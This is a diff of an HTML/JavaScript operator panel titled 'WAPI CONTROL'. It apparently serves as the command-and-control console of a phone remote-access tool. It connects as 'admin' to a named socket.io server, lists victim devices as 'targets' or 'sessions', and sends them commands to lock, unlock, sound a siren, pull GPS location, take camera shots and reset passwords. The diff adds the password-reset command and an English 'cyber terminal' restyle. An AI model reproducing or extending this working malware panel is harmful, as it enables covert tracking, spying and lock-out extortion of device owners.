@@ -5,68 +5,107 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WAPI CONTROL</title>
     <style>
+        :root {
+            --bg: #0a0e0c;
+            --card: #0f1612;
+            --border: #1a3322;
+            --green: #00ff41;
+            --green-dim: #00cc33;
+            --text: #c0d6c0;
+            --text-dim: #5a7a5a;
+            --red: #ff3344;
+            --gold: #ffb800;
+            --blue: #00aaff;
+            --purple: #9944ff;
+        }
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#0b0b0f;color:#cdd6f4;font-family:'Segoe UI',system-ui,sans-serif;padding:12px;min-height:100vh}
-        .header{background:linear-gradient(135deg,#1e1e2e,#181825);border:1px solid #313244;padding:16px;border-radius:14px;text-align:center;margin-bottom:12px}
-        .header h1{color:#cba6f7;font-size:20px;font-weight:700;letter-spacing:1px}
-        .header p{color:#6c7086;font-size:10px;margin-top:2px;text-transform:uppercase;letter-spacing:2px}
-        .card{background:#1e1e2e;border:1px solid #313244;border-radius:14px;padding:14px;margin-bottom:10px}
-        .card h3{color:#cba6f7;font-size:12px;font-weight:600;margin-bottom:8px;text-transform:uppercase;letter-spacing:1px}
-        button{padding:12px;margin:3px;border:none;border-radius:8px;font-weight:600;font-size:11px;cursor:pointer;transition:all .2s;letter-spacing:1px}
-        button:active{transform:scale(.96)}
-        .btn-red{background:#2a1118;color:#f38ba8;border:1px solid #482332}
-        .btn-red:hover{background:#e64553;color:#fff}
-        .btn-green{background:#111f1a;color:#a6e3a1;border:1px solid #1e3a2e}
-        .btn-green:hover{background:#40a02b;color:#fff}
-        .btn-blue{background:#111827;color:#89b4fa;border:1px solid #1e2e4a}
-        .btn-yellow{background:#211d10;color:#f9e2af;border:1px solid #3d3418}
-        .btn-purple{background:#17112a;color:#cba6f7;border:1px solid #2e2250}
-        .btn-gray{background:#181825;color:#6c7086;border:1px solid #313244}
+        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;padding:10px;min-height:100vh;
+            background-image:radial-gradient(ellipse at top,rgba(0,255,65,.03),transparent 70%),
+            repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.01) 2px,rgba(0,255,65,.01) 4px)}
+        
+        .header{text-align:center;padding:14px 0;margin-bottom:8px}
+        .header h1{color:var(--green);font-size:22px;font-weight:800;letter-spacing:3px;text-shadow:0 0 20px rgba(0,255,65,.4)}
+        .header .sub{color:var(--text-dim);font-size:9px;letter-spacing:2px;text-transform:uppercase;margin-top:2px}
+        
+        .card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px;margin-bottom:8px;
+            box-shadow:0 0 15px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.02)}
+        .card h3{color:var(--green);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:2px;margin-bottom:8px;
+            display:flex;align-items:center;gap:6px}
+        .card h3::before{content:'';width:8px;height:8px;background:var(--green);border-radius:50%;box-shadow:0 0 8px var(--green)}
+        
+        input{width:100%;padding:10px 14px;background:#0a0f0b;color:var(--green);border:1px solid var(--border);border-radius:8px;
+            font-size:11px;font-family:'JetBrains Mono',monospace;outline:none;transition:.2s}
+        input:focus{border-color:var(--green);box-shadow:0 0 10px rgba(0,255,65,.1)}
+        input::placeholder{color:#2a4a2a}
+        
+        button{padding:11px 8px;margin:2px;border:1px solid var(--border);border-radius:8px;font-weight:600;font-size:10px;
+            cursor:pointer;transition:all .2s;letter-spacing:1px;background:var(--card);color:var(--text)}
+        button:hover{border-color:var(--green);box-shadow:0 0 12px rgba(0,255,65,.1)}
+        button:active{transform:scale(.95)}
+        
+        .btn-green{background:#0a1a0d;color:var(--green);border-color:#1a4422}
+        .btn-green:hover{background:#0d220f;box-shadow:0 0 15px rgba(0,255,65,.2)}
+        .btn-red{background:#1a0a0d;color:var(--red);border-color:#441122}
+        .btn-red:hover{background:#220d0f;box-shadow:0 0 15px rgba(255,51,68,.2)}
+        .btn-gold{background:#1a120a;color:var(--gold);border-color:#44331a}
+        .btn-blue{background:#0a141a;color:var(--blue);border-color:#1a3344}
+        .btn-purple{background:#120a1a;color:var(--purple);border-color:#331a44}
+        
         .btn-full{width:100%}
-        .btn-half{width:48%;display:inline-block}
-        .grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
-        .status-dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:6px}
-        .dot-live{background:#a6e3a1;box-shadow:0 0 8px #a6e3a1}
-        .dot-dead{background:#f38ba8;box-shadow:0 0 8px #f38ba8}
-        .target-item{background:#181825;padding:12px;border-radius:8px;margin:4px 0;cursor:pointer;border:1px solid #313244;display:flex;justify-content:space-between;align-items:center;font-size:11px}
-        .target-item:hover{border-color:#cba6f7}
-        .target-item.active{border-color:#cba6f7;background:#1e1e2e}
-        hr{border:none;border-top:1px solid #313244;margin:10px 0}
-        #status{font-size:10px;color:#6c7086}
+        .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px}
+        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:5px}
+        
+        .dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:6px}
+        .dot-on{background:var(--green);box-shadow:0 0 6px var(--green)}
+        .dot-off{background:var(--red);box-shadow:0 0 6px var(--red)}
+        
+        .target-item{background:#0d130f;padding:10px;border-radius:8px;margin:3px 0;cursor:pointer;border:1px solid #1a2a1e;
+            display:flex;justify-content:space-between;align-items:center;font-size:10px;transition:.2s}
+        .target-item:hover{border-color:var(--green);background:#0f1a11}
+        .target-item.active{border-color:var(--green);background:#0f1a11;box-shadow:0 0 10px rgba(0,255,65,.08)}
+        
+        hr{border:none;border-top:1px solid #1a2a1e;margin:8px 0}
+        #status{font-size:9px;color:var(--text-dim);margin-top:4px}
+        .active-target{color:var(--green);text-shadow:0 0 6px rgba(0,255,65,.3)}
     </style>
 </head>
 <body>
 
 <div class="header">
     <h1>WAPI CONTROL</h1>
-    <p>panel kendali &bull; real‑time</p>
+    <div class="sub">cyber terminal &bull; real‑time panel</div>
 </div>
 
 <div class="card">
-    <h3>KONEKSI</h3>
-    <button class="btn-green btn-full" onclick="connect()">SAMBUNG</button>
-    <p id="status">terputus</p>
+    <h3>NODE</h3>
+    <input type="text" id="serverUrl" value="https://wafii.pythonanywhere.com" readonly>
+    <button class="btn-green btn-full" onclick="connect()" style="margin-top:6px">CONNECT</button>
+    <p id="status">disconnected</p>
 </div>
 
 <div class="card">
-    <h3>TARGET</h3>
-    <div id="targets"><p style="color:#6c7086;font-size:10px;">menunggu target...</p></div>
+    <h3>SESSIONS</h3>
+    <div id="targets"><p style="color:#3a5a3a;font-size:10px;">waiting for sessions...</p></div>
 </div>
 
 <div class="card">
-    <h3>KONTROL</h3>
-    <button class="btn-red btn-full" onclick="send('lock')">🔒 KUNCI</button>
-    <button class="btn-green btn-full" onclick="send('unlock')">🔓 LEPAS</button>
+    <h3>CONTROLS &mdash; <span id="activeLabel" class="active-target">no target</span></h3>
+    
+    <div class="grid-2">
+        <button class="btn-red btn-full" onclick="send('lock')">🔒 LOCK</button>
+        <button class="btn-green btn-full" onclick="send('unlock')">🔓 RELEASE</button>
+    </div>
     <hr>
-    <div class="grid">
-        <button class="btn-yellow btn-half" onclick="send('siren')">🔊 ALARM</button>
-        <button class="btn-blue btn-half" onclick="send('vibrate')">📳 GETAR</button>
-        <button class="btn-yellow btn-half" onclick="send('flash_on')">💡 SENTER</button>
-        <button class="btn-blue btn-half" onclick="send('flash_off')">🌑 MATI</button>
-        <button class="btn-purple btn-half" onclick="send('wallpaper')">🖼 WALL</button>
-        <button class="btn-purple btn-half" onclick="send('mp3')">🎵 MP3</button>
-        <button class="btn-gray btn-half" onclick="send('gps')">📍 GPS</button>
-        <button class="btn-gray btn-half" onclick="send('camera')">📸 KAMERA</button>
+    <div class="grid-3">
+        <button class="btn-red" onclick="send('siren')">🔊</button>
+        <button class="btn-blue" onclick="send('vibrate')">📳</button>
+        <button class="btn-gold" onclick="send('flash_on')">💡</button>
+        <button class="btn-gold" onclick="send('flash_off')">🌑</button>
+        <button class="btn-purple" onclick="send('wallpaper')">🖼</button>
+        <button class="btn-purple" onclick="send('mp3')">🎵</button>
+        <button class="btn-blue" onclick="send('gps')">📍</button>
+        <button class="btn-blue" onclick="send('camera')">📸</button>
+        <button class="btn-red" onclick="send('reset_password')">🔑</button>
     </div>
 </div>
 
@@ -74,13 +113,15 @@
 <script>
 var s,ct=null,all=[];
 function connect(){
-    s=io('https://wafii.pythonanywhere.com',{query:{role:'admin'}});
-    document.getElementById('status').innerHTML='<span class="status-dot dot-live"></span> tersambung';
+    var url=document.getElementById('serverUrl').value.trim();
+    s=io(url,{query:{role:'admin'}});
+    document.getElementById('status').innerHTML='<span class="dot dot-on"></span> connected';
     s.on('targets',function(d){all=d;render()});
+    s.on('disconnect',function(){document.getElementById('status').innerHTML='<span class="dot dot-off"></span> disconnected'});
 }
-function render(){var el=document.getElementById('targets');if(all.length===0){el.innerHTML='<p style="color:#6c7086;font-size:10px;">tidak ada target</p>';return}el.innerHTML=all.map(function(t){return'<div class="target-item'+(ct===t.id?' active':'')+'" onclick="select(\''+t.id+'\')"><span><span class="status-dot '+(t.online?'dot-live':'dot-dead')+'"></span><b>'+t.id+'</b></span><span style="color:#585b70">▶</span></div>'}).join('')}
-function select(id){ct=id;render()}
-function send(cmd){if(!s||!ct){alert('Pilih target!');return}s.emit('command',{targetId:ct,cmd:cmd})}
+function render(){var el=document.getElementById('targets');if(all.length===0){el.innerHTML='<p style="color:#3a5a3a;font-size:10px;">no active sessions</p>';return}el.innerHTML=all.map(function(t){return'<div class="target-item'+(ct===t.id?' active':'')+'" onclick="select(\''+t.id+'\')"><span><span class="dot '+(t.online?'dot-on':'dot-off')+'"></span><b>'+t.id+'</b></span><span style="color:#3a5a3a">▶</span></div>'}).join('')}
+function select(id){ct=id;document.getElementById('activeLabel').textContent=id;render()}
+function send(cmd){if(!s||!ct){alert('Select target!');return}s.emit('command',{targetId:ct,cmd:cmd})}
 </script>
 </body>
 </html>
